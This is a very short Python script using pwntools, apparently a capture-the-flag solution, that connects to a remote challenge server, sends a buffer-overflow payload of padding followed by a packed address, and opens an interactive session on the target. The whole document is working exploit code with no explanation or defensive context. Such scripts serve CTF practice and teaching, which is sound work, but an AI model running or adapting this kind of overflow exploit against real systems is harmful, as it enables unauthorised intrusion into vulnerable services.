from pwn import *

io = remote('redirect.do-not-trust.hacking.run', 10406)
payload = b'a'*(0x30 - 0x4) + p64(0x41348000)
io.sendline(payload)
io.interactive()